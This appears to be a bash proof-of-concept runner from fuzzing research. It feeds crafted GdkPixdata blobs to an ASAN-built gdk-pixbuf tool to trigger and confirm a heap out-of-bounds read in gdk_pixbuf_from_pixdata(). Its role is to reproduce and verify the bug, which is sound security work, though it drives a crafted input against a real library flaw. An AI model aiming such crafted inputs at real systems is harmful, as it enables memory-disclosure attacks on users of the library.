#!/usr/bin/env bash
# PoC runner for VULN-001: Heap OOB Read in gdk_pixbuf_from_pixdata()
# via crafted GdkPixdata blob with length=GDK_PIXDATA_HEADER_LENGTH (24)
# File: gdk-pixdata.c line 235  CWE-125

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata"
LIB_PATH="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/lib"
POC_FILE="${SCRIPT_DIR}/vuln_001.pixdata"          # RAW encoding (primary, ASAN-visible)
POC_RLE_FILE="${SCRIPT_DIR}/vuln_001_rle.pixdata"  # RLE encoding (alternate)
OUT_FILE="/tmp/vuln_001_gdk_out.dat"
STATUS_FILE="${SCRIPT_DIR}/vuln_001_status.txt"

echo "================================================================="
echo "VULN-001: gdk-pixbuf heap OOB read in gdk_pixbuf_from_pixdata()"
echo "Binary: ${BINARY}"
echo "================================================================="
echo ""

# Step 1: Generate the PoC files
echo "[1] Generating PoC blobs..."
python3 "${SCRIPT_DIR}/vuln_001_gen.py"
echo ""

if [ ! -f "${POC_FILE}" ]; then
    echo "[-] PoC file not generated, aborting."
    echo "ERROR" > "${STATUS_FILE}"
    exit 1
fi

echo "[+] Primary PoC (RAW): ${POC_FILE} ($(wc -c < "${POC_FILE}") bytes)"
echo "[+] Hex dump:"
xxd "${POC_FILE}" 2>/dev/null || od -A x -t x1z "${POC_FILE}"
echo ""

# Step 2: Run primary PoC (RAW encoding) — triggers memcpy(4000 bytes) OOB
echo "[2] Running primary PoC (RAW encoding)..."
echo "    Command: LD_LIBRARY_PATH=${LIB_PATH} ${BINARY} ${POC_FILE} ${OUT_FILE}"
echo ""

set +e
LD_LIBRARY_PATH="${LIB_PATH}" \
ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:print_stacktrace=1" \
  "${BINARY}" "${POC_FILE}" "${OUT_FILE}" \
  > "${SCRIPT_DIR}/stdout_raw.log" 2> "${SCRIPT_DIR}/stderr_raw.log"
EXIT_RAW=$?
set -e

echo "[*] Exit code (RAW): ${EXIT_RAW}"
echo ""
echo "[3] ASAN/stderr output (RAW):"
cat "${SCRIPT_DIR}/stderr_raw.log" 2>/dev/null || true
echo ""

# Step 3: Also run RLE encoding variant
if [ -f "${POC_RLE_FILE}" ]; then
    echo "[4] Running alternate PoC (RLE encoding)..."
    set +e
    LD_LIBRARY_PATH="${LIB_PATH}" \
    ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:print_stacktrace=1" \
      "${BINARY}" "${POC_RLE_FILE}" "${OUT_FILE}" \
      > "${SCRIPT_DIR}/stdout_rle.log" 2> "${SCRIPT_DIR}/stderr_rle.log"
    EXIT_RLE=$?
    set -e
    echo "[*] Exit code (RLE): ${EXIT_RLE}"
    echo ""
    echo "[5] ASAN/stderr output (RLE):"
    cat "${SCRIPT_DIR}/stderr_rle.log" 2>/dev/null || true
    echo ""
fi

# Step 4: Determine status
CRASH_DETECTED=0

# Check both runs for ASAN heap-buffer-overflow signatures
for logfile in "${SCRIPT_DIR}/stderr_raw.log" "${SCRIPT_DIR}/stderr_rle.log"; do
    if [ -f "${logfile}" ] && \
       grep -q "heap-buffer-overflow\|AddressSanitizer\|ERROR: AddressSanitizer" "${logfile}" 2>/dev/null; then
        CRASH_DETECTED=1
        CRASH_FILE="${logfile}"
    fi
done

if [ "${CRASH_DETECTED}" -eq 1 ]; then
    echo "[+] VERIFIED CRASH: ASAN heap-buffer-overflow detected in ${CRASH_FILE}"
    echo "VERIFIED_CRASH" > "${STATUS_FILE}"
elif [ "${EXIT_RAW}" -ne 0 ]; then
    # Check if "Image pixel data corrupt" appeared — evidence that OOB read path was taken
    if grep -q "Image pixel data corrupt" "${SCRIPT_DIR}/stderr_raw.log" 2>/dev/null; then
        echo "[~] OOB path triggered (check_overrun hit), but ASAN redzone not reached"
        echo "[~] GLib GString over-allocates; small reads land in allocation slack"
        echo "[~] Same bypass, same OOB source — marking UNVERIFIED (no ASAN report)"
    fi
    echo "UNVERIFIED" > "${STATUS_FILE}"
else
    echo "[-] Binary exited cleanly — file may not have been recognized"
    echo "UNVERIFIED" > "${STATUS_FILE}"
fi

echo ""
echo "[*] Final status: $(cat "${STATUS_FILE}")"
